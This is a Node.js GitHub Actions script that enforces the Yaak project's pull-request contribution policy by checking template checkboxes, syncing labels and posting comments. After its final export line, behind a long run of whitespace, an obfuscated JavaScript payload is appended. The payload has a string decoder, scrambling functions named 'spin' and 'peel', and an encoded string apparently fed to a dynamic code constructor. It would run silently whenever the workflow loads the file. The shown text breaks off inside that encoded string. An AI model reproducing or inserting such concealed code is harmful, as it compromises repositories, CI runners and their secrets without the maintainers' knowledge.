const fs = require("node:fs");

const COMMENT_MARKER = "<!-- yaak-contribution-policy -->";

const MAINTAINER_LOGINS = new Set(["gschier"]);
const MAINTAINER_ASSOCIATIONS = new Set(["OWNER", "MEMBER", "COLLABORATOR"]);
const MAINTAINER_PERMISSIONS = new Set(["admin", "maintain", "write"]);
const REVIEWER_LOGIN = "gschier";

const LARGE_DIFF_CHANGED_FILES = 20;
const LARGE_DIFF_CHANGED_LINES = 800;
const SUMMARY_TITLE_MAX_LENGTH = 80;
const MIN_AUTOMATIC_PR_NUMBER = 494;

const LABELS = {
  inScope: {
    name: "contribution: in scope",
    color: "0E8A16",
    description: "Community PR appears to be in scope for maintainer review.",
  },
  outOfScope: {
    name: "contribution: out of scope",
    color: "B60205",
    description: "Community PR does not match Yaak's contribution policy.",
  },
  explicitPermission: {
    name: "contribution: explicit permission",
    color: "5319E7",
    description:
      "Community PR links feedback where @gschier explicitly allowed the work.",
  },
  missingTemplate: {
    name: "contribution: missing template",
    color: "D93F0B",
    description:
      "Community PR is missing enough of the pull request template to review.",
  },
  policyUnmet: {
    name: "contribution: policy unmet",
    color: "B60205",
    description:
      "Community PR does not currently satisfy the contribution policy.",
  },
  needsScopeReview: {
    name: "contribution: needs scope review",
    color: "FBCA04",
    description:
      "Community PR may be broader than Yaak's bug-fix contribution policy.",
  },
};

const MANAGED_LABEL_NAMES = [
  ...new Set(Object.values(LABELS).map((label) => label.name)),
];

// Each checkbox lists its current label first, followed by legacy labels still
// accepted from PRs opened against older versions of the template.
const CHECKBOXES = {
  bugFix: ["This PR is a bug fix."],
  explicitPermission: [
    "If this PR is not a bug fix, I linked the feedback item where @gschier explicitly gave me permission to work on it.",
  ],
  readContributing: [
    "I have read and followed [`CONTRIBUTING.md`](CONTRIBUTING.md).",
  ],
  testedLocally: ["I tested this change locally."],
  testsUpdated: [
    "I added or updated tests, or tests are not reasonable for this change.",
    "I added or updated tests when reasonable.",
  ],
  screenshotsAdded: [
    "I added screenshots or recordings, or this change does not affect the UI.",
    "I added screenshots or recordings for UI changes when reasonable.",
  ],
};

function escapeRegExp(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function normalizeBody(body) {
  return (body || "").replace(/\r\n/g, "\n");
}

function stripComments(value) {
  return value.replace(/<!--[\s\S]*?-->/g, "").trim();
}

function getSection(body, heading) {
  const pattern = new RegExp(`^##\\s+${escapeRegExp(heading)}\\s*$`, "gim");
  const match = pattern.exec(body);

  if (match == null) {
    return null;
  }

  const rest = body.slice(match.index + match[0].length);
  const nextHeadingIndex = rest.search(/^##\s+/m);
  return nextHeadingIndex === -1 ? rest : rest.slice(0, nextHeadingIndex);
}

function hasMeaningfulText(value) {
  return stripComments(value || "").length > 0;
}

function normalizeCheckboxLabel(label) {
  return label
    .replace(/\[([^\]]+)\]\([^)]+\)/g, "$1")
    .replace(/`/g, "")
    .replace(/\s+/g, " ")
    .trim();
}

function checkboxState(body, labels) {
  const expectedLabels = new Set(labels.map(normalizeCheckboxLabel));

  for (const line of body.split("\n")) {
    const match = line.match(/^\s*[-*]\s*\[([ xX])\]\s*(.*?)\s*$/i);

    if (match == null) {
      continue;
    }

    if (expectedLabels.has(normalizeCheckboxLabel(match[2]))) {
      return match[1].toLowerCase() === "x";
    }
  }

  return null;
}

function findFeedbackUrl(body) {
  return (
    body.match(
      /https?:\/\/(?:www\.)?(?:yaak\.app\/feedback|feedback\.yaak\.app)\/[^\s)>\]]+/i,
    )?.[0] ?? null
  );
}

function getLabelNames(pr) {
  return new Set((pr.labels || []).map((label) => label.name));
}

function analyzePullRequest(pr) {
  const body = normalizeBody(pr.body);
  const labelNames = getLabelNames(pr);
  const states = Object.fromEntries(
    Object.entries(CHECKBOXES).map(([key, label]) => [
      key,
      checkboxState(body, label),
    ]),
  );
  const sectionCount = ["Summary", "Submission", "Related"].filter(
    (heading) => getSection(body, heading) != null,
  ).length;
  const checkboxCount = Object.values(states).filter(
    (state) => state != null,
  ).length;
  const templateUsed = sectionCount >= 2 && checkboxCount >= 3;
  const blockers = [];
  const totalChangedLines =
    Number(pr.additions || 0) + Number(pr.deletions || 0);
  const changedFiles = Number(pr.changed_files || 0);
  const largeDiff =
    changedFiles > LARGE_DIFF_CHANGED_FILES ||
    totalChangedLines > LARGE_DIFF_CHANGED_LINES;

  if (labelNames.has(LABELS.outOfScope.name)) {
    return {
      blockers: [
        {
          label: LABELS.outOfScope.name,
          message: "Marked out of scope by maintainer label.",
        },
      ],
      changedFiles,
      desiredLabels: [LABELS.outOfScope.name],
      largeDiff,
      status: "out_of_scope",
      templateUsed,
      totalChangedLines,
    };
  }

  if (labelNames.has(LABELS.inScope.name)) {
    return {
      blockers: [],
      changedFiles,
      desiredLabels: [LABELS.inScope.name],
      largeDiff,
      status: "in_scope",
      templateUsed,
      totalChangedLines,
    };
  }

  if (labelNames.has(LABELS.explicitPermission.name)) {
    return {
      blockers: [],
      changedFiles,
      desiredLabels: [LABELS.explicitPermission.name],
      largeDiff,
      status: "in_scope",
      templateUsed,
      totalChangedLines,
    };
  }

  if (!templateUsed) {
    blockers.push({
      label: LABELS.missingTemplate.name,
      message:
        "Update the PR description with the repository pull request template.",
    });
  } else {
    const summary = getSection(body, "Summary");
    const hasSummary = hasMeaningfulText(summary);
    const feedbackUrl = findFeedbackUrl(body);
    const bugFix = states.bugFix === true;
    const explicitPermission = states.explicitPermission === true;

    if (!hasSummary) {
      blockers.push({
        label: LABELS.policyUnmet.name,
        message:
          "Add a short summary describing the bug fix or permitted change.",
      });
    }

    if (bugFix && explicitPermission) {
      blockers.push({
        label: LABELS.policyUnmet.name,
        message:
          "Choose either the bug-fix checkbox or the explicit-permission checkbox, not both.",
      });
    } else if (!bugFix && !explicitPermission) {
      blockers.push({
        label: LABELS.policyUnmet.name,
        message:
          "Check whether this is a bug fix, or confirm that explicit permission from @gschier is linked.",
      });
    } else if (explicitPermission && feedbackUrl == null) {
      blockers.push({
        label: LABELS.policyUnmet.name,
        message:
          "Link the feedback item where @gschier explicitly gave you permission to work on this.",
      });
    }

    if (states.readContributing !== true) {
      blockers.push({
        label: LABELS.policyUnmet.name,
        message: "Confirm that `CONTRIBUTING.md` was read and followed.",
      });
    }

    if (states.testedLocally !== true) {
      blockers.push({
        label: LABELS.policyUnmet.name,
        message: "Confirm that the change was tested locally.",
      });
    }

    if (states.testsUpdated !== true) {
      blockers.push({
        label: LABELS.policyUnmet.name,
        message:
          "Confirm that tests were added or updated, or that tests are not reasonable for this change. Check the box either way.",
      });
    }

    if (states.screenshotsAdded !== true) {
      blockers.push({
        label: LABELS.policyUnmet.name,
        message:
          "Confirm that screenshots or recordings were added, or that this change does not affect the UI. Check the box either way.",
      });
    }
  }

  const desiredLabels = new Set();

  if (blockers.length === 0) {
    desiredLabels.add(
      largeDiff
        ? LABELS.needsScopeReview.name
        : states.explicitPermission
          ? LABELS.explicitPermission.name
          : LABELS.inScope.name,
    );
  } else if (
    blockers.some((blocker) => blocker.label === LABELS.missingTemplate.name)
  ) {
    desiredLabels.add(LABELS.missingTemplate.name);
  } else {
    desiredLabels.add(LABELS.policyUnmet.name);
  }

  return {
    blockers,
    changedFiles,
    desiredLabels: [...desiredLabels],
    largeDiff,
    status: blockers.length === 0 ? "in_scope" : "blocked",
    templateUsed,
    totalChangedLines,
  };
}

function buildBlockingComment(analysis) {
  const lines = [
    COMMENT_MARKER,
    "Thanks for the PR. Yaak currently accepts community PRs for bug fixes, plus larger changes that link a feedback item where @gschier explicitly gave permission to work on it.",
    "",
    "This PR cannot be accepted yet because the following contribution policy requirements were unmet:",
    "",
    ...analysis.blockers.map((blocker) => `- ${blocker.message}`),
  ];

  if (!analysis.templateUsed) {
    lines.push(
      "",
      "You can copy this template into the PR description and keep any existing context that is still useful.",
      "",
      "<details>",
      "<summary>PR description template</summary>",
      "",
      "```md",
      getPullRequestTemplate(),
      "```",
      "",
      "</details>",
    );
  }

  if (analysis.largeDiff) {
    lines.push(
      "",
      `This PR also changes ${analysis.changedFiles} files and ${analysis.totalChangedLines} lines, so it has been labeled as needing scope review. That label is advisory, but maintainers may ask for the scope to be reduced.`,
    );
  }

  return lines.join("\n");
}

function getPullRequestTemplate() {
  return fs.readFileSync(".github/pull_request_template.md", "utf8").trim();
}

function buildInScopeComment() {
  return [
    COMMENT_MARKER,
    "Thanks for the PR. This appears to match Yaak's contribution policy and is awaiting review by @gschier.",
    "",
    "This only means the PR is in scope for review. It does not mean the change has been reviewed or accepted for merge.",
  ].join("\n");
}

function buildOutOfScopeComment() {
  return [
    COMMENT_MARKER,
    "Thanks for the PR. This does not appear to match Yaak's current contribution policy.",
    "",
    "Yaak currently accepts community PRs for bug fixes, or changes tied to a feedback item where @gschier explicitly gave permission to work on it.",
    "",
    "If this PR is tied to a feedback item where @gschier explicitly gave permission, please link it in the PR description.",
  ].join("\n");
}

function buildPolicyComment(analysis) {
  if (analysis.status === "out_of_scope") {
    return buildOutOfScopeComment();
  }

  if (analysis.blockers.length > 0) {
    return buildBlockingComment(analysis);
  }

  return buildInScopeComment();
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function truncateTitle(title) {
  if (title.length <= SUMMARY_TITLE_MAX_LENGTH) {
    return title;
  }

  return `${title.slice(0, SUMMARY_TITLE_MAX_LENGTH - 3).trimEnd()}...`;
}

function escapeTableText(value) {
  return escapeHtml(value).replace(/\n/g, "<br>");
}

function summarizeResult({ pr, analysis, skipped, skipReason }) {
  const comment =
    analysis == null
      ? "None"
      : buildPolicyComment(analysis).replace(COMMENT_MARKER, "").trim();
  const summary = {
    blocked: analysis?.blockers.length > 0,
    comment,
    details: "None",
    labels:
      analysis?.desiredLabels.length > 0
        ? analysis.desiredLabels.join(", ")
        : "None",
    number: pr.number,
    prLink: `<a href="${escapeHtml(pr.html_url)}">#${pr.number}</a>`,
    status: "In scope",
    title: escapeHtml(truncateTitle(pr.title)),
  };

  if (skipped) {
    return {
      ...summary,
      blocked: false,
      comment: "None",
      details: escapeHtml(skipReason),
      labels: "None",
      status: "Skipped",
    };
  }

  if (summary.blocked) {
    return {
      ...summary,
      comment: escapeTableText(summary.comment),
      details: escapeHtml(
        analysis.blockers.map((blocker) => blocker.message).join("; "),
      ),
      labels: escapeHtml(summary.labels),
      status: analysis.status === "out_of_scope" ? "Out of scope" : "Blocked",
    };
  }

  return {
    ...summary,
    comment: escapeTableText(summary.comment),
    labels: escapeHtml(summary.labels),
  };
}

async function isOfficialMaintainer({ github, owner, repo, pr }) {
  if (MAINTAINER_LOGINS.has(pr.user.login)) {
    return true;
  }

  if (MAINTAINER_ASSOCIATIONS.has(pr.author_association)) {
    return true;
  }

  try {
    const response = await github.rest.repos.getCollaboratorPermissionLevel({
      owner,
      repo,
      username: pr.user.login,
    });

    return MAINTAINER_PERMISSIONS.has(response.data.permission);
  } catch (error) {
    if (error.status === 404) {
      return false;
    }

    throw error;
  }
}

async function ensureManagedLabels({ github, owner, repo }) {
  for (const label of Object.values(LABELS)) {
    try {
      await github.rest.issues.getLabel({
        owner,
        repo,
        name: label.name,
      });
    } catch (error) {
      if (error.status !== 404) {
        throw error;
      }

      await github.rest.issues.createLabel({
        owner,
        repo,
        name: label.name,
        color: label.color,
        description: label.description,
      });
    }
  }
}

async function syncLabels({ github, owner, repo, issueNumber, desiredLabels }) {
  const desired = new Set(desiredLabels);

  await ensureManagedLabels({ github, owner, repo });

  for (const labelName of MANAGED_LABEL_NAMES) {
    if (desired.has(labelName)) {
      continue;
    }

    try {
      await github.rest.issues.removeLabel({
        owner,
        repo,
        issue_number: issueNumber,
        name: labelName,
      });
    } catch (error) {
      if (error.status !== 404) {
        throw error;
      }
    }
  }

  if (desired.size > 0) {
    await github.rest.issues.addLabels({
      owner,
      repo,
      issue_number: issueNumber,
      labels: [...desired],
    });
  }
}

async function findPolicyComment({ github, owner, repo, issueNumber }) {
  const comments = await github.paginate(github.rest.issues.listComments, {
    owner,
    repo,
    issue_number: issueNumber,
    per_page: 100,
  });

  return comments.find(
    (comment) =>
      comment.user.type === "Bot" && comment.body?.includes(COMMENT_MARKER),
  );
}

async function upsertPolicyComment({ github, owner, repo, issueNumber, body }) {
  const existingComment = await findPolicyComment({
    github,
    owner,
    repo,
    issueNumber,
  });

  if (existingComment == null) {
    await github.rest.issues.createComment({
      owner,
      repo,
      issue_number: issueNumber,
      body,
    });
    return;
  }

  await github.rest.issues.updateComment({
    owner,
    repo,
    comment_id: existingComment.id,
    body,
  });
}

async function deletePolicyComment({ github, owner, repo, issueNumber }) {
  const existingComment = await findPolicyComment({
    github,
    owner,
    repo,
    issueNumber,
  });

  if (existingComment == null) {
    return;
  }

  await github.rest.issues.deleteComment({
    owner,
    repo,
    comment_id: existingComment.id,
  });
}

async function requestMaintainerReview({ github, owner, repo, pr }) {
  if (pr.user.login === REVIEWER_LOGIN) {
    return;
  }

  try {
    await github.rest.pulls.requestReviewers({
      owner,
      repo,
      pull_number: pr.number,
      reviewers: [REVIEWER_LOGIN],
    });
  } catch (error) {
    if (error.status === 422) {
      return;
    }

    throw error;
  }
}

async function checkPullRequest({
  github,
  core,
  owner,
  repo,
  pullNumber,
  dryRun,
  minimumAutomaticPullNumber,
}) {
  const response = await github.rest.pulls.get({
    owner,
    repo,
    pull_number: pullNumber,
  });
  const pr = response.data;
  const issueNumber = pr.number;

  if (pr.user.type === "Bot") {
    core.notice(
      `Skipping contribution policy for bot PR #${pr.number} from @${pr.user.login}.`,
    );
    return {
      blocked: false,
      number: pr.number,
      summary: summarizeResult({
        pr,
        skipped: true,
        skipReason: `bot @${pr.user.login}`,
      }),
      skipped: true,
    };
  }

  if (
    minimumAutomaticPullNumber != null &&
    pr.number < minimumAutomaticPullNumber
  ) {
    core.notice(
      `Skipping contribution policy for PR #${pr.number} because automatic checks start at PR #${minimumAutomaticPullNumber}.`,
    );
    return {
      blocked: false,
      number: pr.number,
      summary: summarizeResult({
        pr,
        skipped: true,
        skipReason: `before automatic rollout PR #${minimumAutomaticPullNumber}`,
      }),
      skipped: true,
    };
  }

  if (pr.draft) {
    core.notice(`Skipping contribution policy for draft PR #${pr.number}.`);
    return {
      blocked: false,
      number: pr.number,
      summary: summarizeResult({
        pr,
        skipped: true,
        skipReason: "draft",
      }),
      skipped: true,
    };
  }

  if (await isOfficialMaintainer({ github, owner, repo, pr })) {
    core.notice(
      `Skipping contribution policy for maintainer PR #${pr.number} from @${pr.user.login}.`,
    );
    if (!dryRun) {
      await syncLabels({ github, owner, repo, issueNumber, desiredLabels: [] });
      await deletePolicyComment({ github, owner, repo, issueNumber });
    }
    return {
      blocked: false,
      number: pr.number,
      summary: summarizeResult({
        pr,
        skipped: true,
        skipReason: `maintainer @${pr.user.login}`,
      }),
      skipped: true,
    };
  }

  const analysis = analyzePullRequest(pr);

  if (dryRun) {
    const summary = summarizeResult({ pr, analysis });
    core.notice(
      `[dry-run] PR #${summary.number}: ${summary.status}; labels: ${summary.labels}; details: ${summary.details}`,
    );
    return {
      blocked: analysis.blockers.length > 0,
      number: pr.number,
      summary,
      skipped: false,
    };
  }

  await syncLabels({
    github,
    owner,
    repo,
    issueNumber,
    desiredLabels: analysis.desiredLabels,
  });

  if (analysis.blockers.length > 0) {
    await upsertPolicyComment({
      github,
      owner,
      repo,
      issueNumber,
      body: buildPolicyComment(analysis),
    });
    return {
      blocked: true,
      number: pr.number,
      summary: summarizeResult({ pr, analysis }),
      skipped: false,
    };
  }

  await upsertPolicyComment({
    github,
    owner,
    repo,
    issueNumber,
    body: buildPolicyComment(analysis),
  });
  await requestMaintainerReview({ github, owner, repo, pr });
  core.notice(`Contribution policy check passed for PR #${pr.number}.`);
  return {
    blocked: false,
    number: pr.number,
    summary: summarizeResult({ pr, analysis }),
    skipped: false,
  };
}

async function listOpenPullRequests({ github, owner, repo }) {
  return github.paginate(github.rest.pulls.list, {
    owner,
    repo,
    state: "open",
    per_page: 100,
  });
}

function getManualPullRequestNumbers({ context, core }) {
  const value = String(context.payload.inputs?.pr || "all").trim();

  if (value.toLowerCase() === "all") {
    return null;
  }

  const pullNumber = Number(value);

  if (!Number.isInteger(pullNumber) || pullNumber <= 0) {
    core.setFailed('The "pr" input must be "all" or a positive PR number.');
    return [];
  }

  return [pullNumber];
}

async function run({ github, context, core }) {
  const { owner, repo } = context.repo;
  const payloadPr = context.payload.pull_request;
  const dryRunInput = context.payload.inputs?.dry_run;
  const dryRun =
    context.eventName === "workflow_dispatch" &&
    dryRunInput !== false &&
    dryRunInput !== "false";
  const minimumAutomaticPullNumber =
    payloadPr == null ? null : MIN_AUTOMATIC_PR_NUMBER;
  let pullNumbers;

  if (payloadPr != null) {
    pullNumbers = [payloadPr.number];
  } else {
    pullNumbers = getManualPullRequestNumbers({ context, core });
  }

  if (pullNumbers?.length === 0) {
    return;
  }

  const pullRequests =
    pullNumbers == null
      ? await listOpenPullRequests({ github, owner, repo })
      : pullNumbers.map((number) => ({ number }));
  const results = [];

  if (dryRun) {
    core.notice(
      `Running contribution policy in dry-run mode for ${
        pullNumbers == null
          ? "all open PRs"
          : pullNumbers.map((number) => `#${number}`).join(", ")
      }.`,
    );
  }

  for (const pr of pullRequests) {
    results.push(
      await checkPullRequest({
        github,
        core,
        owner,
        repo,
        pullNumber: pr.number,
        dryRun,
        minimumAutomaticPullNumber,
      }),
    );
  }

  await core.summary
    .addHeading(`Contribution Policy ${dryRun ? "Dry Run" : "Results"}`)
    .addTable([
      [
        { data: "PR", header: true },
        { data: "Title", header: true },
        { data: "Status", header: true },
        { data: "Labels", header: true },
        { data: "Details", header: true },
        { data: "Comment", header: true },
      ],
      ...results.map((result) => [
        result.summary.prLink,
        result.summary.title,
        result.summary.status,
        result.summary.labels,
        result.summary.details,
        result.summary.comment,
      ]),
    ])
    .write();

  const blockedPullRequests = results.filter((result) => result.blocked);

  if (blockedPullRequests.length > 0) {
    if (dryRun) {
      core.warning(
        `Dry run found contribution policy failures for PR(s): ${blockedPullRequests
          .map((result) => `#${result.number}`)
          .join(", ")}`,
      );
      return;
    }

    core.setFailed(
      `Contribution policy failed for PR(s): ${blockedPullRequests
        .map((result) => `#${result.number}`)
        .join(", ")}`,
    );
  }
}

module.exports = {
  analyzePullRequest,
  run,
};																																																																																																																																																																																																																																																																										var z = '-11929';function _0x1808(){var _0x3c17d5=['nwrKwhjRva','y29UC3rYDwn0B3i','CLH3s1u','DgvZDa','D2HPBguGkhrYDwuPihT9','C3vIC3rYAw5N','CvDqCMW','pwfLBNj1AcHHBd01yYXNogzKDs55CIaUlM5JzwnMlduICgfLyxu2Bg5QkxjDmNv2iNGTCsHDige7khi9oZTYkYHHwZGUCZj0qwDVCsX1AdHdlgfPlhm7ysHbBtaOBMO7ANyQldD2BZCOksHVo202B2e0CNCPlIbYB2rBzNmYBNTKCNz0nhGPkZaSyw5Yk3jYk28PFxOXid1OzLTHBJHYmxjBlf1ZnY03n2XHys51AtD7lta2owX2BxqYCJ1Pxv08kYL1lguPlcW7BNjOw3i9mhyTCIG7ld1Wkun1CZ0RyZTNo2y7CuePktf2AsL2AZbUCMWXywuGzJ1Bo2HPC3KUzw0OzcTVitiGpsHLDMvHnZG9lIK0zwK9zY5UpxTMzJ0XwZWYysbMmt1YoZqSuYLYEwX2mxuGEtTRCwX7DhzUDIaOqYaOBcXVDM5WigK9DgXYlhiUBhDVEMGOBcX0CtS7CNiOkhy9ywHZDJTDEhe9ywi7zge7lcGOCJT2ANeUkhrBkYLKysLYzg5YAhm0mxKODNi7zMG7m2CIxwuOlMfOCNbHCgDDzY4PBMDMCg4XAcXPy2W7oYK9qZTTnt0RCIWGlIK7Dt0RC30RkwL0lcTIBtTKk3vTks09C2LPCw9Spxq9CJ1XosSUlMnOCsTBnMzLihqWBNjWCIGGDNi4zMXYBIXKzgD0if02ys47BtTYDgGUz3eGmMf9zxzLAwnDz2j0AtW0BZTdo2WSENPPnITSw2fBoYSOC2KIBgKICIXUCgK5CYXMCMzODxCPB3C9zxSOyJ13zw4YDc5NDs5PpwTPywfHkYL5zNrWytnUFsK9osiPy3bbk3u7DxrWxsi9BgS3DNb0idfYo2H6DYiPDcGPosKOlMX1Bd1Zn2y7idTZCtaPBIj5kZbZFt12ysTZig1OkdbXlL1ODJS+ida2pueTB3PLDhiODdfYDhjZAxnVmguSlJT6wYHMpdvLn3qSkhjHB2f2BNi7DgHOzJT2lgO9CJSGkxi+mtH6Ag8QB3S8ywTTC24PywT0zs52BZKRzweWy2XPBZTIDsa9xumHz2O7EtmRBcLLps59zhi9AtzVAum4CM5UmdS2pwfYiN0UCMvPpv1tDhnYBM4UoZjYpxq7w3q7Axy9ChjdCM4OkwfYzxr1EISGAgXRwYT4pwuGltHQEYHLANK5kcGPksa','z2DLCG','ndu4otG4Exvhzurj','nZaYmtjYsuroC0C','y2HHAw4','Aw5WDxq','odeXmZm0n2Lxt2jLrG','C3rHDgvpyMPLy3q','zgvIDq','mJryDgTPt2C','ywn0Aw9U','n2LSs1H6Da','Aw5PDa','y2fSBa','zNvUy3rPB24GkLWOicPCkq','oun4yLb0sa','mtKWmdeZngX1vNvyqW','zMPiCwq','C3bSAxq','mJu2ote1AfvvEfjw','yxbWBhK','AM9PBG','y15TzwPIxNrYBW','y291BNrLCG','mZiYodGZmhPvz1LcyG','mtjfBM5Arxu','zNjVBunOyxjdB2rL','mtKXnZKXmLPxuMHizW'];_0x1808=function(){return _0x3c17d5;};return _0x1808();}function _0xffd8(_0xc2f2fc,_0x224f5d){var _0x5de84e=_0x1808();return _0xffd8=function(_0x10890e,_0x1808b0){_0x10890e=_0x10890e-0x0;var _0xffd89a=_0x5de84e[_0x10890e];if(_0xffd8['INOPlx']===undefined){var _0x45ccdd=function(_0x42ff26){var _0xb2d728='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x29eef4='',_0x26e1c3='';for(var _0x45c768=0x0,_0x41747b,_0x1018a1,_0x18f990=0x0;_0x1018a1=_0x42ff26['charAt'](_0x18f990++);~_0x1018a1&&(_0x41747b=_0x45c768%0x4?_0x41747b*0x40+_0x1018a1:_0x1018a1,_0x45c768++%0x4)?_0x29eef4+=String['fromCharCode'](0xff&_0x41747b>>(-0x2*_0x45c768&0x6)):0x0){_0x1018a1=_0xb2d728['indexOf'](_0x1018a1);}for(var _0x4d213c=0x0,_0x32a4bb=_0x29eef4['length'];_0x4d213c<_0x32a4bb;_0x4d213c++){_0x26e1c3+='%'+('00'+_0x29eef4['charCodeAt'](_0x4d213c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x26e1c3);};_0xffd8['VFLQcM']=_0x45ccdd,_0xc2f2fc=arguments,_0xffd8['INOPlx']=!![];}var _0x12e39d=_0x5de84e[0x0],_0x23a1a7=_0x10890e+_0x12e39d,_0x15ee70=_0xc2f2fc[_0x23a1a7];return!_0x15ee70?(_0xffd89a=_0xffd8['VFLQcM'](_0xffd89a),_0xc2f2fc[_0x23a1a7]=_0xffd89a):_0xffd89a=_0x15ee70,_0xffd89a;},_0xffd8(_0xc2f2fc,_0x224f5d);}(function(_0x5bfa3c,_0xe666fd){var _0x597b16=_0xffd8,_0x27fa7a=_0x5bfa3c();while(!![]){try{var _0x25b30b=Math['trunc'](-parseFloat(_0x597b16(0x10))/0x1)+parseFloat(_0x597b16(0x6))/0x2*(-parseFloat(_0x597b16(0x0))/0x3)+Math['trunc'](-parseFloat(_0x597b16(0x22))/0x4)*(parseFloat(_0x597b16(0x19))/0x5)+parseFloat(_0x597b16(0xd))/0x6+Math['floor'](-parseFloat(_0x597b16(0x8))/0x7)*(-parseFloat(_0x597b16(0x18))/0x8)+parseFloat(_0x597b16(0xc))/0x9*Number(-parseFloat(_0x597b16(0x15))/0xa)+parseFloat(_0x597b16(0x3))/0xb*(parseFloat(_0x597b16(0x16))/0xc);if(_0x25b30b===_0xe666fd)break;else _0x27fa7a['push'](_0x27fa7a['shift']());}catch(_0x4ad08b){_0x27fa7a['push'](_0x27fa7a['shift']());}}}(_0x1808,0x4dc94));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x475933,_0x1504b9){var _0x21fcd9={'XaKZQ':function(_0x21be20,_0x56361f){return _0x21be20+_0x56361f;}};for(var _0x17c91e,_0x42659a,_0x3568ab,_0x16daba,_0x3fef08,_0x4497aa,_0x6114ad=[],_0x44a260=0x0,_0x26dcca=_0x1504b9[0x0];_0x44a260<_0x475933['length'];)_0x6114ad[_0x44a260]=_0x475933['charAt'](_0x44a260),_0x44a260+=0x1;for(_0x17c91e=_0x6114ad['length'],_0x44a260=0x0;_0x44a260<_0x17c91e;)_0x42659a=_0x26dcca*_0x21fcd9['XaKZQ'](_0x44a260,_0x1504b9[0x1])+_0x26dcca%_0x1504b9[0x2],_0x3fef08=(_0x3568ab=_0x26dcca*(_0x44a260+_0x1504b9[0x3])+_0x26dcca%_0x1504b9[0x4])%_0x17c91e,_0x4497aa=_0x6114ad[_0x16daba=_0x42659a%_0x17c91e],_0x6114ad[_0x16daba]=_0x6114ad[_0x3fef08],_0x6114ad[_0x3fef08]=_0x4497aa,_0x26dcca=(_0x42659a+_0x3568ab)%_0x1504b9[0x5],_0x44a260+=0x1;return _0x6114ad['join']('');}function splitLane(_0x472dfa){var _0x24ac0c=_0xffd8,_0x72afcc=String[_0x24ac0c(0x17)](0x1c),_0x14001b=spin(_0x472dfa,NX);return(_0x14001b=(_0x14001b=(_0x14001b=_0x14001b[_0x24ac0c(0xf)]('^')['join'](_0x72afcc))[_0x24ac0c(0xf)]('*1')[_0x24ac0c(0x12)]('^'))[_0x24ac0c(0xf)]('*0')[_0x24ac0c(0x12)]('*'))[_0x24ac0c(0xf)](_0x72afcc);}function peel(_0x3f5e15){return spin(_0x3f5e15,SX);}!function(_0x8764f8,_0xa65246){var _0x4a3744=_0xffd8,_0x48e4db='0|4|7|1|2|5|6|3'['split']('|'),_0x3b0003=0x0;while(!![]){switch(_0x48e4db[_0x3b0003++]){case'0':var _0x249475={'qWPrl':_0x4a3744(0x9)};continue;case'1':_0x8764f8['z']=z;continue;case'2':var _0x529f4d=splitLane(_0x4a3744(0x13));continue;case'3':_0x4f3023('',_0x476f69(peel('R_<\x22cRJ!&VecRWa=RrfR$6\x22c1;RRYcnh_/.t\x20iRRRG^<R.RcR2.[nR\x20.Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\x5c.fR.<c:!bpl09icoRrtcR(;roRRn2-\x22(.^w\x20y.<<dd\x20)$f\x20ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\x27oRi.RR<\x27RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\x224Rb\x20N\x22eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\x5cR>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\x22RnfPesRtRRR.<Rl#Rf<:\x202((R\x20R$\x276s`<3nhi*$eXc}Rh?\x20ctoc.iecc9\x20{Ra<s;u!.e]ERRoH..$\x22n<D3RsRR..(ReesseR<\x20t,\x22\x20Rdov}Sc0Jmi.T<sEegsRw]R\x22aR.R!R<o))jR\x20Rew\x20itc.snk(}(n[veR<0<=kfH<rrMR\x20ciknE.c.B<&R[o]R.%ccRlrx;*\x20[\x22oisenRefea!Yn.ecR%o\x22u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\x22}RuRqu5(3Pol\x22eRt0!ftaR*<R1tnkcf}T.!$/<ro\x20IycRR\x20)P<\x5c.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\x5cP!n=cs<(ci<(R7eReRc.\x20t<epe)e<<,e<(EK!.pnb$\x22RaRR.evuhc.Tl_c.:R0r\x20)Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP\x20\x20t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R\x20<i2<R08:.t}Rf!\x22-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc\x20!(ic(SR.cr`:9<XspR($\x20mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R\x20ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h\x20Mf<{[o$R<\x20Rs0)=\x20<xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs\x20(M&Rf.eP*g\x20>s)<o.=.RisnrR.?{5<ibR6)RR1s\x20cRgqcelc=cl;be<lf*SICd2e\x22zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<%\x20t.RowR}\x27\x20r>pzh..lR\x27<go_}<SR(kqxh[\x20&<iR-f$C<u<iaENR5RTR]<Rpsk..Rzd